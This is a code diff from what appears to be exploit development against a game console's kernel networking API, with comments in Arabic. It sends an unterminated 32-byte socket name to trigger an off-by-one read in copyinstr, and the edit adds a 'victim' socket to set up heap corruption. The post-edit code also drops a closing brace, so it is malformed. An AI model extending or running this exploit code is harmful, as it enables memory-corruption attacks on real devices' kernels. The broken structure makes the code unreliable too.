@@ -18,22 +18,21 @@ int _main(struct thread *td) {
     memset(name, 0x41, 0x20);  // 'A' * 32
     // لا نضع null! → copyinstr يقرأ byte إضافية
 
-    printf_debug("creating socket with 0x20-byte name (no null)...\n");
+    printf_debug("creating socket ...\n");
+
+    // [1] أنشئ socket عادي
+    int victim = sceNetSocket("victim", AF_INET, SOCK_STREAM, 0);
+    printf_debug("victim fd=%d\n", victim);
 
     // وهي تمرر name كـ param_1
-    int fd = sceNetSocket(name, AF_INET, SOCK_STREAM, 0);
+    int r = sceNetSocket(name, AF_INET, SOCK_STREAM, 0);
 
-    printf_debug("fd=%d errno=%d\n", fd, sce_net_errno);
+    printf_debug("fd=%d errno=%d\n", r, sce_net_errno);
 
-    if (fd > 0) {
+    if (victim > 0) {
         printf_debug("[+] socket created!\n");
-        printf_debug("[+] off-by-one triggered on socket+0x408\n");
-
-        sceNetSocketClose(fd);
-        printf_debug("closed - check for heap corruption\n");
-    } else {
-        printf_debug("[-] failed\n");
-    }
+        int r2 = sceNetSocketClose(victim);
+printf_debug("victim close r=%d\n", r2);
 
     return 0;
 }
